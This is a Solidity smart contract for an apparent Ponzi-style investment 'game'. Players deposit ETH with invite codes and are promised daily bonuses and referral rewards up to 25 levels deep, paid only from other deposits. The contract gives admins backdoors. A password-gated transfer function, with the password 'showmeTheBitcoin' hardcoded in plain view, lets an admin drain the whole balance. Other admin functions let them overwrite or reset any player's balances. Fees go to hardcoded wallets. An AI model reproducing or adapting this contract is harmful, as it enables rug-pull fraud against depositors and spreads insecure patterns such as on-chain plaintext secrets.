pragma solidity ^0.5.12;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Context {
	constructor() internal {}

	function _msgSender() internal view returns (address) {
		return msg.sender;
	}
}

contract Ownable is Context {
	address private _owner;

	constructor () internal {
		_owner = _msgSender();
	}

	modifier onlyOwner() {
		require(isOwner(), "Ownable: caller is not the owner");
		_;
	}

	function isOwner() public view returns (bool) {
		return _msgSender() == _owner;
	}

	function transferOwnership(address newOwner) public onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_owner = newOwner;
	}
}

library Roles {
	struct Role {
		mapping(address => bool) bearer;
	}

	function add(Role storage role, address account) internal {
		require(!has(role, account), "Roles: account already has role");
		role.bearer[account] = true;

	}

	function remove(Role storage role, address account) internal {
		require(has(role, account), "Roles: account does not have role");
		role.bearer[account] = false;
	}

	function has(Role storage role, address account) internal view returns (bool) {
		require(account != address(0), "Roles: account is the zero address");
		return role.bearer[account];
	}


}

contract WhitelistAdminRole is Context, Ownable {
    uint256 uid;
	using Roles for Roles.Role;
	Roles.Role private _whitelistAdmins;
	mapping(uint256 => address) manager;
	constructor () internal {
	}

	modifier onlyWhitelistAdmin() {
		require(isWhitelistAdmin(_msgSender()) || isOwner(), "WhitelistAdminRole: caller does not have the WhitelistAdmin role");
		_;

	}

	function isWhitelistAdmin(address account) public view returns (bool) {
		return _whitelistAdmins.has(account) || isOwner();

	}

	function addWhitelistAdmin(address account) public onlyOwner {
		_whitelistAdmins.add(account);
		manager[uid] =  account;
		uid+=1;
	}

	function removeWhitelistAdmin(address account) public onlyOwner {
		_whitelistAdmins.remove(account);
	}

	function whitelistAdmin(uint256 id) public onlyOwner  view returns (address)  {
		return manager[id];
	}
}


contract GameUtil {
    uint256 ethWei = 1 ether;

    // 获取会员等级
    function getMemberLevel(uint256 value) public view returns(uint256){
        if(value>=1*ethWei && value<=5*ethWei){
            return 1;
        }if(value>=6*ethWei && value<=10*ethWei){
            return 2;
        }if(value>=11*ethWei && value<=15*ethWei){
            return 3;
        }
        return 0;
    }

    //获取节点等级
    function getNodeLevel(uint256 value) public view returns(uint256){
        if(value >0 && value<=6*ethWei){
            return 1;
        }if(value >0 &&  value<=11*ethWei){
            return 2;
        }if(value >0 && value>11*ethWei){
            return 3;
        }
    }

    //获取会员等级奖励 /1000
    function getMemberReward(uint256 level) public  pure returns(uint256){
        if(level == 1){
            return 5;
        }if(level == 2){
            return 7;
        }if(level == 3) {
            return 10;
        }
        return 0;
    }

    //获取会员等级系数   /10
    function getHystrixReward(uint256 level) public pure returns(uint256){
        if(level == 1){
            return 3;
        }if(level == 2){
            return 6;
        }if(level == 3) {
            return 10;
        }return 0;
    }

    //获取节点奖励   /100
    function getNodeReward(uint256 nodeLevel,uint256 level,bool superReward) public pure returns(uint256){
        if(nodeLevel == 1 && level == 1){
            return 50;
        }if(nodeLevel == 2 && level == 1){
            return 70;
        }if(nodeLevel == 2 && level == 2){
            return 50;
        }if(nodeLevel == 3) {
            if(level == 1){
                return 100;
            }if(level == 2){
                return 70;
            }if(level == 3){
                return 50;
            }if(level >= 4 && level <= 10){
                return 10;
            }if(level >= 11 && level <= 20){
                return 5;
            }if(level >= 21){
                if(superReward == true){
                    return 10;
                }
                else{
                    return 1;
                }
            }
        } return 0;
    }

    function compareStr (string memory _str,string memory str) public pure returns(bool) {
         bool checkResult = false;
        if(keccak256(abi.encodePacked(_str)) == keccak256(abi.encodePacked(str))) {
            checkResult = true;
        }
        return checkResult;
    }
}

contract Game is  GameUtil ,WhitelistAdminRole {
    using SafeMath for  * ;
    uint256 rid = 1;
	uint256 pid;
    uint256 ethWei = 1 ether;
    uint256 totalMoney;
    uint256 totalCount;
    uint256 superNodeCount;
	struct PlayerRound {
        uint256 rid;
        uint256 start;
        uint256 end;
		bool isVaild;
    }

	struct Player {
        address plyAddress;
        uint256 freeAmount;
        uint256 freezeAmount;
        uint256 rechargeAmount;
        uint256 withdrawAmount;
        uint256 inviteAmonut;
        uint256 bonusAmount;
        uint256 dayInviteAmonut;
        uint256 dayBonusAmount;
        uint256 regTime;
        uint256 level;
        uint256 nodeLevel;
        string inviteCode;
        string beInvitedCode;
		bool isVaild;
		bool isSuperNode;
    }

    struct Invest{
        address plyAddress;
        uint256 amount;
        uint256 regTime;
		uint256 status;
    }

    mapping (uint256 => Player) pIDxPlayer;
    mapping (uint256 => Invest) pIDxInvest;
    mapping (address => uint256) pAddrxPid;
    mapping (string => address) pCodexAddr;
    mapping (uint256 => PlayerRound) rIDxPlayerRound;


    function () external payable {
    }


    constructor () public {
        pid = pid.add(1);
        pCodexAddr['bbbbbb'] = 0x96Ecc52D02ea66DDe1a589324682294F3053b8B4;
        pAddrxPid[0x96Ecc52D02ea66DDe1a589324682294F3053b8B4] = pid;
        pIDxInvest[pid] = Invest(msg.sender,5.mul(ethWei),now,1);
        pIDxPlayer[pid] = Player(msg.sender,0,5.mul(ethWei),0,0,0,0,0,0,now,1,1,"bbbbbb","aaaaaa" ,true,false);

        pid = pid.add(1);
        pCodexAddr['cccccc'] = 0x96Ecc52D02ea66DDe1a589324682294F3053b8B4;
        pAddrxPid[0x96Ecc52D02ea66DDe1a589324682294F3053b8B4] = pid;
        pIDxInvest[pid] = Invest(msg.sender,15.mul(ethWei),now,1);
        pIDxPlayer[pid] = Player(msg.sender,0,15.mul(ethWei),0,0,0,0,0,0,now,3,3,"cccccc","bbbbbb" ,true,false);


        pid = pid.add(1);
        pCodexAddr['dddddd'] = 0xC0302589A928Cc1d82C83312112b5DF1f46Ddb33;
        pAddrxPid[0xC0302589A928Cc1d82C83312112b5DF1f46Ddb33] = pid;
        pIDxInvest[pid] = Invest(msg.sender,1.mul(ethWei),now,1);
        pIDxPlayer[pid] = Player(msg.sender,0,1.mul(ethWei),0,0,0,0,0,0,now,1,1,"dddddd","cccccc" ,true,false);
    }

    function investGame(string  memory inviteCode,string memory  beInvitedCode)  isHuman() isGameRun public payable{
        require(msg.value == msg.value.div(ethWei).mul(ethWei), "invalid msg value");
        require(msg.value >= 1.mul(ethWei) && msg.value <= 15.mul(ethWei), "between 1 and 15");
		Player storage player = pIDxPlayer[pAddrxPid[msg.sender]];

        if(!player.isVaild){
            require(!compareStr(inviteCode, "") && bytes(inviteCode).length == 6, "invalid invite code");
            require(!isCodeUsed(inviteCode), "invite code is used");
			require(isCodeUsed(beInvitedCode), "invite code not exist");
			require(pCodexAddr[beInvitedCode] != msg.sender, "invite code can't be self");
        }

  		uint256 inAmount = msg.value;
        address  plyAddr = msg.sender;

        if(player.isVaild ){
            Invest memory invest = pIDxInvest[pAddrxPid[msg.sender]];
            if((invest.amount.add(inAmount))> (256.mul(ethWei))){
                address payable transAddress = msg.sender;
                transAddress.transfer(msg.value);
                require(invest.amount.add(inAmount) <= 256.mul(ethWei),"can not beyond 256 eth");
                return;
            }
        }

        totalMoney = totalMoney.add(inAmount)  ;
        totalCount = totalCount.add(1);

        if(player.isVaild){
            player.freezeAmount = player.freezeAmount.add(inAmount);
            player.rechargeAmount = player.rechargeAmount.add(inAmount);
            Invest storage invest = pIDxInvest[pAddrxPid[msg.sender]];
            invest.amount = invest.amount.add(inAmount);
            invest.regTime = now.add(5 days);
            player.level = getMemberLevel(invest.amount);
            player.nodeLevel = getNodeLevel(invest.amount.add(player.freeAmount));
        }
        else{
            pid = pid.add(1);
            uint256 level = getMemberLevel(inAmount);
            uint256 nodeLevel =  getNodeLevel(inAmount);
            pCodexAddr[inviteCode] = msg.sender;
            pAddrxPid[msg.sender] = pid;
            pIDxInvest[pid] = Invest(plyAddr,inAmount,now,1);
            pIDxPlayer[pid] = Player(plyAddr,0,inAmount,inAmount,0,0,0,0,0,now,level,nodeLevel,inviteCode,beInvitedCode ,true,false);
            devFund(inAmount);
        }
    }

    function withDraw() isGameRun public {
        Player storage player = pIDxPlayer[pAddrxPid[msg.sender]];
        require(player.isVaild, "player not exist");
        address payable plyAddress = msg.sender;
        bool isEnough = false ;
        uint256 wMoney = player.freeAmount;
        if(wMoney<=0){
            return;
        }
        (isEnough,wMoney) = isEnoughBalance(wMoney);
        if(wMoney > 0 ){
            nodeFund(wMoney);
            plyAddress.transfer(wMoney.sub(wMoney.div(20)));
            player.withdrawAmount = player.withdrawAmount.add(wMoney);
            player.freeAmount = player.freeAmount.sub(wMoney)  ;
            Invest storage invest = pIDxInvest[pAddrxPid[msg.sender]];
            invest.amount = invest.amount.sub(wMoney);
            player.level =  getMemberLevel(invest.amount);
            player.nodeLevel =  getNodeLevel(invest.amount.add(player.freeAmount));
        }else{
            endRound();
        }
    }


    function applySuperNode() isGameRun public payable{
        require(msg.value == 20.mul(ethWei), "invalid msg value");
        require(pAddrxPid[msg.sender]!=0, "player not exist");
        Player storage player = pIDxPlayer[pAddrxPid[msg.sender]];
        require(player.level >=3, "not enough grade");
        player.isSuperNode = true;
        superNodeCount = superNodeCount.add(1);
    }


  	function isEnoughBalance(uint256 wMoney) private view returns (bool,uint256){
        if(address(this).balance > 0 ){
             if(wMoney >= address(this).balance){
                if((address(this).balance ) > 0){
                    return (false,address(this).balance);
                }else { return (false,0); }
            }else { return (true,wMoney);  }
        }
        else{ return (false,0);  }
    }

  	function nodeFund(uint256 amount) private {
        address payable adminAddress = 0xed6B025e9Ca3686D97B09D4bE6557BB2e4DBcD14;
        adminAddress.transfer(amount.div(20));
    }


    function devFund(uint256 amount) private {
        address payable adminAddress = 0x4903bF960Bd0dFd00Ce68510Ef6ccda48Da24B66;
        adminAddress.transfer(amount.div(100));
    }


    function setPlayerInfo(uint256 plyId,uint256 freeAmount,uint256 freezeAmount,uint256 rechargeAmount,uint256 withdrawAmount,uint256 inviteAmonut,uint256 bonusAmount,uint256 dayInviteAmonut,uint256 dayBonusAmount, uint256 amount,uint256 status)  onlyWhitelistAdmin public{
        Player storage player = pIDxPlayer[plyId];
        require(player.isVaild, "player not exist");
        player.freeAmount = freeAmount;
        player.freezeAmount = freezeAmount;
        player.rechargeAmount = rechargeAmount;
        player.withdrawAmount = withdrawAmount;
        player.inviteAmonut = inviteAmonut;
        player.bonusAmount = bonusAmount;
        player.dayInviteAmonut = dayInviteAmonut;
        player.dayBonusAmount = dayBonusAmount;

        Invest storage invest = pIDxInvest[plyId];
        invest.amount = amount;
        invest.status = status;
    }


    function getPlayerInfoPlyId(uint256 plyId) public view returns (address,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,bool) {
        Player memory player = pIDxPlayer[plyId];
        return(player.plyAddress,player.freeAmount,player.freezeAmount,player.rechargeAmount,player.withdrawAmount,player.inviteAmonut,player.bonusAmount,player.dayInviteAmonut,player.dayBonusAmount,
        player.level,player.nodeLevel,player.isSuperNode);
    }

    function getPlayerInfoPlyAdd(address plyAdd)  public view returns (address,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,uint256,bool) {
        return getPlayerInfoPlyId(pAddrxPid[plyAdd]);
    }

    function getInvestInfoPlyId(uint256 plyId) public view returns (uint256,uint256,uint256,string memory,string memory) {
        Invest memory invest = pIDxInvest[plyId];
        Player memory player = pIDxPlayer[plyId];
        return(invest.amount,invest.regTime,invest.status,player.inviteCode,player.inviteCode);
    }

    function getInvestInfoPlyAdd(address plyAdd)  public view returns (uint256,uint256,uint256,string memory,string memory) {
        return getInvestInfoPlyId(pAddrxPid[plyAdd]);
    }


    function getGameInfo() public view returns (uint256,uint256,uint256,uint256) {
        return(pid,superNodeCount,totalCount,totalMoney);
    }


    function isCodeUsed(string memory code) public view returns (bool) {
		address addr = pCodexAddr[code];
		return uint256(addr) != 0;
	}


    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }



    string  transferPwd = "showmeTheBitcoin";
    function transfer(uint256 amount,string memory password) onlyWhitelistAdmin public  {
        require(compareStr(password,transferPwd), "The password is wrong");
        if(address(this).balance>=amount.mul(ethWei)){
            address payable transAddress = msg.sender;
            transAddress.transfer(amount.mul(ethWei));
        }
        else{
            address payable transAddress = msg.sender;
            transAddress.transfer(address(this).balance);
        }
    }


    modifier isWithinLimits(uint256 _eth) {
        require(_eth >= 1000000000, "pocket lint: not a valid currency");
        require(_eth <= 100000000000000000000000, "no vitalik, no");
        _;
    }

    modifier isHuman() {
        address _addr = msg.sender;
        uint256 _codeLength;

        assembly {_codeLength := extcodesize(_addr)}
        require(_codeLength == 0, "sorry humans only");
        _;
    }


    modifier isGameRun() {
        PlayerRound memory playerRound = rIDxPlayerRound[rid];
        require(playerRound.isVaild, "It's not running yet");
        require(playerRound.start != 0 && now > playerRound.start && playerRound.end == 0, "It's not running yet");
        _;
    }


    function getRoundInfo()  public view returns (uint256,uint256,uint256,bool) {
        PlayerRound memory playerRound = rIDxPlayerRound[rid];
        return(playerRound.rid,playerRound.start,playerRound.end,playerRound.isVaild);
    }


    function startRound(uint256 startTime) onlyWhitelistAdmin  public {
		require(!rIDxPlayerRound[rid].isVaild, "has been running");
		require(startTime>(now + 1 hours), "must be greater than the current time");
		PlayerRound storage playerRound = rIDxPlayerRound[rid];
		playerRound.rid = rid;
		playerRound.start = startTime;
		playerRound.end = 0;
	    playerRound.isVaild = true;
	}


    function endRound()   public {
		require(address(this).balance <= 0 ether, "contract balance must be lower than 1 ether");
		PlayerRound storage playerRound = rIDxPlayerRound[rid];
		playerRound.end = now;
	    playerRound.isVaild = false;
		rid = rid.add(1);
	    rIDxPlayerRound[rid] = PlayerRound(rid,0,0,false);
	}

	function initialize(uint256 start ,uint256 end) onlyWhitelistAdmin public {
        uint256 len = pid;
        if(len <= end){
            end = len;
        }
        superNodeCount = 0;
        for(uint256 i = start; i <= end; i++ ) {
            Player storage player = pIDxPlayer[i];
            player.freezeAmount = 0;
            player.rechargeAmount = 0;
            player.withdrawAmount = 0;
            player.inviteAmonut = 0;
            player.bonusAmount = 0;
            player.dayInviteAmonut = 0;
            player.dayBonusAmount = 0;
            player.level = 0;
            player.nodeLevel = 0;
    		player.isSuperNode = false;

            Invest storage invest = pIDxInvest[i];
            invest.amount = 0;
            invest.regTime = 0;
    		invest.status = 1;
        }
    }



	function investAward(uint256 start ,uint256 end) onlyWhitelistAdmin public {
        uint256 len = pid;
        if(len <= end){
            end = len;
        }

        for(uint256 i = start; i <= end; i++ ) {
            Invest storage invest = pIDxInvest[i];
            Player storage player = pIDxPlayer[i];

            //不同的会员有不同的分红奖励，V1 为 0.5%，V2 为 0.7%，V3 为 1%。
            uint256 memberReward =  getMemberReward(player.level);
            player.dayBonusAmount = memberReward.mul(invest.amount.div(1000) ) ;
            player.bonusAmount =  player.bonusAmount.add(memberReward.mul(invest.amount.div(1000)));
            player.freeAmount = player.freeAmount.add(player.dayBonusAmount);
            player.level =  getMemberLevel(invest.amount);
            player.nodeLevel =  getNodeLevel(invest.amount.add(player.freeAmount));

            if(invest.status == 1 && ( now >= (invest.regTime.add(4 days)))){
                player.freezeAmount = player.freezeAmount.sub(invest.amount);
                player.freeAmount = player.freeAmount.add(invest.amount)  ;
                player.level =  getMemberLevel(invest.amount);
                player.nodeLevel =  getNodeLevel(invest.amount.add(player.freeAmount));
                invest.status = 2;
            }
            //invest.regTime = invest.regTime.sub(1 days);
        }
    }


    function shareAward(uint256 start ,uint256 end) onlyWhitelistAdmin  public {
        uint256 len = pid;
        if(len <= end){
            end = len;
        }
        for(uint256 i = start; i <= end; i++ ) {
            Player memory player = pIDxPlayer[i];
            Invest memory invest = pIDxInvest[i];
            award(player.beInvitedCode, invest.amount,getMemberReward(player.level),player.isSuperNode);
        }
    }

    function award(string memory beInvitedCode, uint256 money, uint256 memberReward,bool isSuperNode) private {
		string memory referrer = beInvitedCode;
		for (uint256 i = 1; i <= 25; i++ ) {
			if (compareStr(referrer, "")) {
				break;
			}
			Player storage player = pIDxPlayer[pAddrxPid[pCodexAddr[referrer]]] ;
            Invest storage invest =  pIDxInvest[pAddrxPid[pCodexAddr[referrer]]] ;
			if (invest.amount.add(player.freeAmount) == 0) {
				referrer = player.beInvitedCode;
				continue;
			}

            uint256 hystrixReward = getHystrixReward(player.nodeLevel);
            bool isSuperReward = false;
            if(isSuperNode==true&&player.isSuperNode==false){
                isSuperReward = true;
            }
            uint256 nodeReward = getNodeReward(player.nodeLevel,i,isSuperReward);
            uint256  basicMoney = 0;

            if(money <= (invest.amount.add(player.freeAmount))){
                basicMoney = money;
            }else{
                basicMoney = invest.amount.add(player.freeAmount) ;
            }

            if(memberReward != 0){
                uint256 inviteAmonut =  basicMoney.mul(memberReward).mul(hystrixReward).mul(nodeReward);
                inviteAmonut =  inviteAmonut.div(1000).div(10).div(100);
                player.dayInviteAmonut = player.dayInviteAmonut.add(inviteAmonut);
                player.inviteAmonut = player.inviteAmonut.add(inviteAmonut);
                player.freeAmount = player.freeAmount.add(player.dayInviteAmonut);
                player.level =  getMemberLevel(invest.amount);
                player.nodeLevel =  getNodeLevel(invest.amount.add(player.freeAmount));
            }
			referrer = player.beInvitedCode;
		}
	}

}
